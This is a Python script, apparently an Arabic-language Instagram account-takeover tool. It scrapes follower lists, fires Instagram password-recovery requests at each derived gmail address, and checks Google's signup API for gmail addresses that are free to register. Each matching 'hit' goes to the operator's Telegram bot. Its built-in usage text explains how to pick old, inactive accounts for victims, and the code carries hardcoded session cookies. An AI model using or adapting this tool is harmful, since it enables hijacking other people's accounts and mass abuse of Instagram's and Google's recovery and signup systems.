# Ethan-gmail
import os
import requests
from user_agent import generate_user_agent
from time import time
from hashlib import md5
from random import choice
from concurrent.futures import ThreadPoolExecutor
from cfonts import render, say
from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
import random
import base64
import re
import ethan
import sys
from asmix import Instagram
#=============================#
hits=0
bads_instgram=0
bads_email=0
p1=0
#=============================#
Z = '\033[1;31m'  # أحمر
b = random.randint(5,208)
bo = f'\x1b[38;5;{b}m'
Z1 = '\033[2;31m'  # أحمر ثاني
F = '\033[2;32m'  # أخضر
A = '\033[2;34m'  # أزرق
C = '\033[1;97m'  # أبيض
J = '\033[2;36m'  # سماوي
Y = '\033[1;34m'  # أزرق فاتح
X = '\033[1;33m'  # أصفر
M = '\x1b[1;37m'  # أبيض
S = '\033[1;33m'  # أصفر
R = '\033[1;31m'  # أحمر
C1 = '\033[2;35m'  # وردي
H = '\x1b[38;5;208m'  # برتقالي
ED = '\x1b[38;5;208m'  # برتقالي
Bl = '\033[1;34m'  # أزرق
P = '\033[1;35m'  # بنفسجي
G = '\033[1;32m'  # أخضر
N = '\033[1;37m'  # أبيض
#=============================#
def banner():
	WDEH = render('{END}', colors=['red', 'white'], align='center')
	print(f'''{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
 {N}DEV / @ FFNZZ{R}| {N} IG /@KWFXX{R}| {N}PROGRAMMER /#ETHAN 
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
''')
	print(f'''{N}                                𝐖𝐄𝐋𝐂𝐎𝐌 𝐓𝐎 𝐄𝐓𝐇𝐀𝐍 𝐈𝐆 𝐓𝐎𝐎𝐋 
	
{R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 
''')
banner()

def fs(id):
    sessionid = k.cookies['sessionid']
    global p1
    url = f'https://i.instagram.com/api/v1/friendships/{id}/followers/?count=100&search_surface=follow_list_pag'
    headers = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cookie': f'mid=Y3bGYwALAAHNwaKANMB8QCsRu7VA; ig_did=092BD3C7-0BB2-414B-9F43-3170EAED8778; ig_nrcb=1; shbid=1685054; shbts=1675191368.6684434090; rur=CLN; ig_direct_region_hint=ATN; csrftoken=gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO; ds_user_id=921803283; sessionid={sessionid}',
        'Sec-Ch-Prefers-Color-Scheme': 'dark',
        'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
        'Sec-Ch-Ua-Full-Version-List': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.201", "Microsoft Edge";v="114.0.1823.67"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
        'X-Asbd-Id': '129477',
        'X-Csrftoken': 'gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO',
        'X-Ig-App-Id': '936619743392459',
        'X-Ig-Www-Claim': 'hmac.AR0g7ECdkTdrXy37TE9AoSnMndccWbB1cqrccYOZSLfcb8sd',
        'X-Requested-With': 'XMLHttpRequest',
    } 
    r = requests.get(url,headers=headers)
    if '{"message":"","spam":true,"status":"fail"}' in r.text:
        exit('block')
    for i in r.json()['users']:
        p1+=1
        userL = i['username']
        sys.stdout.write('\r' + G + str(p1) + f'{bo}  </>  {G}' + userL + '\r')
        with open('username.txt', 'a') as f:
        	f.write(userL+'\n')
    if 'HI' in listoo:
        m_id=r.json()['next_max_id']
        for i in range(9999):
            r = requests.get(f'https://i.instagram.com/api/v1/friendships/{id}/followers/?count=100&max_id='+m_id+'&search_surface=follow_list_page',headers=headers)
            if '{"message":"","spam":true,"status":"fail"}' in r.text:
                exit('block')
            print()
            try:
                for i in r.json()['users']:
                    p1+=1
                    userL = i["username"]
                    sys.stdout.write('\r' + G + str(p1) + f'{bo}  </>  {G}' + userL + '\r')
                    with open('username.txt', 'a') as f:
                    	f.write(userL+'\n')
                try:
                    m_id=r.json()['next_max_id']
                except:
                    break
            except:
                if 'challenge' in r.text:
                    break
                else:
                    continue
    else:pass
    exit()


def fg(id):
    global p1
    url = f'https://i.instagram.com/api/v1/friendships/{id}/following/?count=200'
    headers = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cookie': f'mid=Y3bGYwALAAHNwaKANMB8QCsRu7VA; ig_did=092BD3C7-0BB2-414B-9F43-3170EAED8778; ig_nrcb=1; shbid=1685054; shbts=1675191368.6684434090; rur=CLN; ig_direct_region_hint=ATN; csrftoken=gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO; ds_user_id=921803283; sessionid={sessionid}',
        'Sec-Ch-Prefers-Color-Scheme': 'dark',
        'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
        'Sec-Ch-Ua-Full-Version-List': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.201", "Microsoft Edge";v="114.0.1823.67"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
        'X-Asbd-Id': '129477',
        'X-Csrftoken': 'gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO',
        'X-Ig-App-Id': '936619743392459',
        'X-Ig-Www-Claim': 'hmac.AR0g7ECdkTdrXy37TE9AoSnMndccWbB1cqrccYOZSLfcb8sd',
        'X-Requested-With': 'XMLHttpRequest',
    } 
    r = requests.get(url,headers=headers)
    print()
    if '{"message":"","spam":true,"status":"fail"}' in r.text:
        exit('block')
    
    for i in r.json()['users']:
        p1+=1
        userL = i['username']
        sys.stdout.write('\r' + G + str(p1) + f'{bo}  </>  {G}' + userL + '\r')
        with open('username.txt', 'a') as f:
        	f.write(userL+'\n')
    if 'HI' in listoo:
        try:
            m_id=r.json()['next_max_id']
        except KeyError:
            exit()
        for i in range(9999):
            r = requests.get(f'https://i.instagram.com/api/v1/friendships/{id}/following/?count=200&max_id='+m_id,headers=headers)
            if '{"message":"","spam":true,"status":"fail"}' in r.text:
                exit('block')
            try:
                for i in r.json()['users']:
                    p1+=1
                    userL = i["username"]
                    sys.stdout.write('\r' + G + str(p1) + f'{bo}  </>  {G}' + userL + '\r')
                    with open('username.txt', 'a') as f:
                    	f.write(userL+'\n')
                try:
                    m_id=r.json()['next_max_id']
                except:
                    break
            except:
                if 'challenge' in r.text:
                    break
                else:
                    continue
    else:pass
    exit()
def delet_list():
    try:
        txt  = "username.txt"
        if os.path.exists(txt):
            os.system(f'rm -rf {txt}')
            print(f'\n - {R}𝐃𝐞𝐥𝐞𝐭𝐞𝐝')
            exit()
        else:
            print(f'\n - {R}𝐅𝐢𝐥𝐞 𝐝𝐨𝐞𝐬 𝐧𝐨𝐭 𝐞𝐱𝐢𝐬𝐭')
            exit()
    except Exception as e:
    	print(e)

ID = input(f"{ED}𝐄𝐍𝐓𝐄𝐑 𝐈𝐃 :  ")
print('')
token = input(f"{P}𝐄𝐍𝐓𝐄𝐑 𝐓𝐎𝐊𝐄𝐍 : ")
print('')
print(f'''
{N}1   {Y}-     {R} CHECK LIST 

{N}2   {Y}-     {R} DELETE LIST

{N}3   {Y}-     {R} MAKE LIST

{N}4   {Y}-     {R} How to use ?
''')
wr=int(input(f'{Y}𝗖𝗛𝗢𝗜𝗖𝗘 : {N} '))
if wr==1:
	pass
elif wr==2:
	delet_list()
elif wr==3:
		os.system('clear')
		listoo = ['HI']    
		linux = 'clear'
		windows = 'cls'
		print('')
		banner() 
		username = str(input(f'{J}ʏᴏᴜʀ ᴜꜱᴇʀɴᴀᴍᴇ {A} : {G}    '))
		password = str(input(f'{J}ʏᴏᴜʀ ʏᴏᴜʀ ᴘᴀꜱꜱᴡᴏʀᴅ {A} : {G}    '))
		print('')
		[linux, windows][os.name == 'nt']
		url = 'https://www.instagram.com/accounts/login/ajax/'
		data = {'username': f'{username}',
	        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
	        'queryParams': '{}',
	        'optIntoOneTap': 'false'}
	       
		headers = {'accept': '*/*',
	    'accept-encoding': 'gzip, deflate, br',
	    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
	    'content-length': '275',
	    'content-type': 'application/x-www-form-urlencoded',
	    'cookie': 'csrftoken=DqBQgbH1p7xEAaettRA0nmApvVJTi1mR; ig_did=C3F0FA00-E82D-41C4-99E9-19345C41EEF2; mid=X8DW0gALAAEmlgpqxmIc4sSTEXE3; ig_nrcb=1',
	    'origin': 'https://www.instagram.com',
	    'referer': 'https://www.instagram.com/',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36',
	    'x-csrftoken': 'DqBQgbH1p7xEAaettRA0nmApvVJTi1mR',
	    'x-ig-app-id': '936619743392459',
	    'x-ig-www-claim': '0',
	    'x-instagram-ajax': 'bc3d5af829ea',
	    'x-requested-with': 'XMLHttpRequest'}		
			
		k = requests.post(url,headers=headers,data=data)
		if 'authenticated":true' in k.text or 'userId' in k.text:
			pass
		else:
			print(f'{R}𝐁𝐀𝐃 𝐋𝐎𝐆𝐈𝐍')
			exit()
		([linux, windows][os.name == 'nt'])
		sessionid = k.cookies['sessionid']
		user = str(input(f'{J}ᴜѕᴇʀɴᴀᴍᴇ ᴏғ ᴛʜᴇ ʟɪꜱᴛ  {A} : {G}'))
		listoo = ['HI']
		rs_id = requests.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),
		headers={
		 'Accept': '*/*',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cookie': f'mid=Y3bGYwALAAHNwaKANMB8QCsRu7VA; ig_did=092BD3C7-0BB2-414B-9F43-3170EAED8778; ig_nrcb=1; shbid=1685054; shbts=1675191368.6684434090; rur=CLN; ig_direct_region_hint=ATN; csrftoken=gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO; ds_user_id=921803283; sessionid={sessionid}',
    'Sec-Ch-Prefers-Color-Scheme': 'dark',
    'Sec-Ch-Ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Microsoft Edge";v="114"',
    'Sec-Ch-Ua-Full-Version-List': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.201", "Microsoft Edge";v="114.0.1823.67"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.67',
    'X-Asbd-Id': '129477',
    'X-Csrftoken': 'gLlFX76z8qqwDgmh8ZIp3uFhAeX4zKdO',
    'X-Ig-App-Id': '936619743392459',
    'X-Ig-Www-Claim': 'hmac.AR0g7ECdkTdrXy37TE9AoSnMndccWbB1cqrccYOZSLfcb8sd',
    'X-Requested-With': 'XMLHttpRequest',
    })
    		
		jsn3=rs_id.json()['data']['user']
		id_tr = jsn3['id']
		print('')
		os.system('clear')
		banner()
		print('')
		print(f''' 
	{A}1      {J} ~     {C} 𝙥𝙪𝙡𝙡 𝙛𝙧𝙤𝙢 𝙛𝙤𝙡𝙡𝙤𝙬𝙞𝙣𝙜
	{A}2      {J} ~     {C}𝙥𝙪𝙡𝙡 𝙛𝙧𝙤𝙢 𝙛𝙤𝙡𝙡𝙤𝙬𝙚𝙧𝙨
	''')
			
		o = str(input(f"{J}𝐂𝐇𝐎𝐎𝐒𝐄 𝐍𝐔𝐌𝐁𝐄𝐑 : {C}"))
		if o == '1':
			os.system('clear')
			banner()
			fg(id_tr)
		elif o == '2':
			os.system('clear')
			banner()
			fs(id_tr)
		else:
		  	print('    eror   ')
		  	exit()
elif wr==4:
	print('''السلام عليكم .
 طريقة الاستخدام كل اتي 
الاداة فيها 3 خيارات

اول ماتشغلها تخلي ايدي التلكرام مالتك وتوكن البوت حتى يوصلك الصيد 

بعدها تضهرلك 3 خيارات

الخيار الاول تفحص اللسته 
الخيار الثاني تحذف اللسته
الخيار الثالث تسحب اللسته


الاستخدام كل اتي

اول شي تختار ثالث خيار حتى تسحب لسته راح يطلب منك يوزر حساب وباسورد حساب لازم تجيب حساب وهمي يكون مافيه مصادقه ويكون نشط من شهر او اسبوعين بل قليل عشان يدخلك بدون ما يبلع سكيور

بعد ماتسجل دخول راح يطلب منك حساب تسحب منه لسته 


هنا تروح تدور على حساب يتابع اكثر من 1500 شخص عل انستكرام ويكون انشائه 2020 واقدم ومو نشط يعني اخر منشور من 2020 اهم شي مايكون نشط 


وتقدر تاخذ انشائات اقل من 2020 المهم 2020 فما تحت ويتابع كثير ناس ومو نشط ومو خاص

بعدها تاخذ يوزر هذا الحساب تنسخه وتخليه بل اداة بدون ( @ ) 

بعدها راح يكلك تسحب من المتابعين لو يتابعهم تختار من الي يتابعهم الي هو خيار رقم 1 

بعد ما تختار وتكمل سحب لسته تروح تشغل الاداة مره ثانيه وتختار الخيار رقم 1 وتبدي تفحص اللسته الاداة

وبعد ما تكمل فحص توقف الاداة تحذف اللسته من خيار رقم 2 وترجع تسحب من خيار 3 من جديد وتفحص من خيار رقم 1 وتضل تكرر 


تحياتي برمجياتي @FFNZZ''')
	ass='''
	السلام عليكم .
 طريقة الاستخدام كل اتي 
الاداة فيها 3 خيارات

اول ماتشغلها تخلي ايدي التلكرام مالتك وتوكن البوت حتى يوصلك الصيد 

بعدها تضهرلك 3 خيارات

الخيار الاول تفحص اللسته 
الخيار الثاني تحذف اللسته
الخيار الثالث تسحب اللسته


الاستخدام كل اتي

اول شي تختار ثالث خيار حتى تسحب لسته راح يطلب منك يوزر حساب وباسورد حساب لازم تجيب حساب وهمي يكون مافيه مصادقه ويكون نشط من شهر او اسبوعين بل قليل عشان يدخلك بدون ما يبلع سكيور

بعد ماتسجل دخول راح يطلب منك حساب تسحب منه لسته 


هنا تروح تدور على حساب يتابع اكثر من 1500 شخص عل انستكرام ويكون انشائه 2020 واقدم ومو نشط يعني اخر منشور من 2020 اهم شي مايكون نشط 


وتقدر تاخذ انشائات اقل من 2020 المهم 2020 فما تحت ويتابع كثير ناس ومو نشط ومو خاص

بعدها تاخذ يوزر هذا الحساب تنسخه وتخليه بل اداة بدون ( @ ) 

بعدها راح يكلك تسحب من المتابعين لو يتابعهم تختار من الي يتابعهم الي هو خيار رقم 1 

بعد ما تختار وتكمل سحب لسته تروح تشغل الاداة مره ثانيه وتختار الخيار رقم 1 وتبدي تفحص اللسته الاداة

وبعد ما تكمل فحص توقف الاداة تحذف اللسته من خيار رقم 2 وترجع تسحب من خيار 3 من جديد وتفحص من خيار رقم 1 وتضل تكرر 


تحياتي برمجياتي @FFNZZ
	'''
	requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ass}")
	exit()
	

os.system('clear')
def namefile():
  banner()
  while True:
    try:
      namefile1= 'username.txt'
   #   namefile1='qq'
      ooo=open(namefile1,"r").read().splitlines()
      return ooo
    except:
      print(f"{R}𝐄𝐑𝐑𝐎𝐑 𝐈𝐍 𝐍𝐀𝐌𝐄  ")
list99=namefile()

yy='azertyuiopmlkjhgfdsqwxcvbn'
ids=[]
def tll():
  try:
    n1=''.join(cc(yy)for i in range(rr(6,9)))
    n2=''.join(cc(yy)for i in range(rr(3,9)))
    host=''.join(cc(yy)for i in range(rr(15,30)))
    he3 = {
      "accept": "*/*",
      "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
      "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
      "google-accounts-xsrf": "1",
      "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
      "sec-ch-ua-arch": "\"\"",
      "sec-ch-ua-bitness": "\"\"",
      "sec-ch-ua-full-version": "\"116.0.5845.72\"",
      "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
      "sec-ch-ua-mobile": "?1",
      "sec-ch-ua-model": "\"ANY-LX2\"",
      "sec-ch-ua-platform": "\"Android\"",
      "sec-ch-ua-platform-version": "\"13.0.0\"",
      "sec-ch-ua-wow64": "?0",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
      "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
      "x-client-data": "CJjbygE=",
      "x-same-domain": "1",
      "Referrer-Policy": "strict-origin-when-cross-origin",
    'user-agent': str(gg()),
    }


    res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
    tok= re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
    cookies={
      '__Host-GAPS':host
    }
    headers = {
      'authority': 'accounts.google.com',
      'accept': '*/*',
      'accept-language': 'en-US,en;q=0.9',
      'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
      'google-accounts-xsrf': '1',
      'origin': 'https://accounts.google.com',
      'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
      'user-agent': gg(),
  }
    data = {
    'f.req': '["'+tok+'","'+n1+'","'+n2+'","'+n1+'","'+n2+'",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
    'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
  }
    response = pp(
      'https://accounts.google.com/_/signup/validatepersonaldetails',
      cookies=cookies,
      headers=headers,
      data=data,
  )
    tl=str(response.text).split('",null,"')[1].split('"')[0]
    host=response.cookies.get_dict()['__Host-GAPS']
    try:os.remove('tl.txt')
    except:pass
    with open('tl.txt','a') as f:
      f.write(tl+'//'+host+'\n')
  except Exception as e:
    print(e)
    tll()
tll()
def check_gmail(email):
  if '@' in email:
    email = str(email).split('@')[0]
  try:
    try:
      o=open('tl.txt','r').read().splitlines()[0]
    except:
      tll()
      o=open('tl.txt','r').read().splitlines()[0]
    tl,host = o.split('//')
    cookies = {
    '__Host-GAPS': host
  }
    headers = {
    'authority': 'accounts.google.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
    'google-accounts-xsrf': '1',
    'origin': 'https://accounts.google.com',
    'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL='+tl,
    'user-agent': gg(),
  }
    params = {
    'TL': tl,
  }
    data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A'+tl+'%22%2C%22'+email+'%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
    response = pp(
    'https://accounts.google.com/_/signup/usernameavailability',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
  )
    if '"gf.uar",1' in str(response.text):return 'good'
    elif '"er",null,null,null,null,400' in str(response.text):
      tll()
      check_gmail(email)
    else:return 'bad'
  except:check_gmail(email)

os.system('clear')

def info(username,jj):
	global hits
	hits+=1
	oo = f"-1::{username}"
	ee = base64.b64encode(oo.encode('utf-8')).decode('utf-8')
	headers = {
	        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    }
	    	
	rr = requests.get(f'https://instanavigation.net/api/v1/stories/{ee}', headers=headers).json()
	id = rr['user_info']['id']
	usern = rr['user_info']['username']
	full = rr['user_info']['full_name']
	ip = rr['user_info']['is_private']
	iv = rr['user_info']['is_verified']
	posts = rr['user_info']['posts']
	followers = rr['user_info']['followers']
	following = rr['user_info']['following']
	date = Instagram.date(id)
	rrr = Instagram.rest(username)
	try:
		ff = f"""
	┒
	┃ 𝗡𝗲𝘄 𝗵𝗶𝘁 𝗶𝗴 𝗮𝗰𝗰𝗼𝘂𝗻𝘁
	┗
	════════════════
	⌊ Followers ⌉  :  {followers}
	⌊ Following ⌉  :  {following}
	⌊ Username ⌉  :  {username}
	⌊ Posts ⌉  :  {posts}
	⌊ Email ⌉  :  {username}@{jj}
	⌊ Date ⌉  :  {date}
	⌊ Rest ⌉  :  {rrr}
	════════════════
	≣ By @FFNZZ 
	        """
	        		
		requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ff}")
	  	
	except:
		ff = f"""
	┒
	┃ 𝗡𝗲𝘄 𝗵𝗶𝘁 𝗶𝗴 𝗮𝗰𝗰𝗼𝘂𝗻𝘁
	┗
	════════════════
	⌊ Username ⌉  :  {username}
	⌊ Email ⌉  :  {username}@{jj}
	⌊ Rest ⌉  :  {rest(username)}
	════════════════
	≣ By @FFNZZ
	        """
	        		
		requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ff}")
def bmw(email):
  global bads_email
  try:

    if 'good' == check_gmail(email):
        username,jj=email.split('@')
        info(username,jj)
    else:bads_email+=1
  except:''

def check(email):
  global bads_instgram,hits,bads_email
  try:
    pp=choice('00')
    b = random.randint(5,208)
    bo = f'\x1b[38;5;{b}m'
    bi = random.randint(5,208)
    bos = f'\x1b[38;5;{bi}m'

    if pp == '0':
        headers = {
                        'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
        'X-Pigeon-Rawclienttime': '1700251574.982',
        'X-IG-Connection-Speed': '-1kbps',
        'X-IG-Bandwidth-Speed-KBPS': '-1.000',
        'X-IG-Bandwidth-TotalBytes-B': '0',
        'X-IG-Bandwidth-TotalTime-MS': '0',
        'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
        'X-IG-Connection-Type': 'WIFI',
        'X-IG-Capabilities': '3brTvw==',
        'X-IG-App-ID': '567067343352427',
        'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
        'Accept-Language': 'en-GB, en-US',
        'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate',
        'Host': 'i.instagram.com',
        'X-FB-HTTP-Engine': 'Liger',
        'Connection': 'keep-alive',
        'Content-Length': '356',
    }
  

        
        
        
        data = {
        f'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"{Lol}","guid":"{Gio}","device_id":"{DvD}","query":"' + email + '"}',
        'ig_sig_key_version': '4',
    }



        respon = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
   
         
        if '"status":"ok"' in respon:bmw(email)
        else:bads_instgram+=1
        
    
  except:''
  
  bi = random.randint(5,208)
  bos = f'\x1b[38;5;{bi}m'
  tt=(f'''
    {bo}  𝐄𝐓𝐇𝐀𝐍 {H} hits : {hits} {M}bad mail : {bads_email} {Z} bad insta : {bads_instgram}
    
               {bo}email : {email}
                              
{bos}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    ''')
  print(tt)


executor = ThreadPoolExecutor(max_workers=30)


for username in list99:
    try:
      if '@' in username:username=username.split('@')[0]
      email = username + '@gmail.com'
      executor.submit(check, email)
    except:''
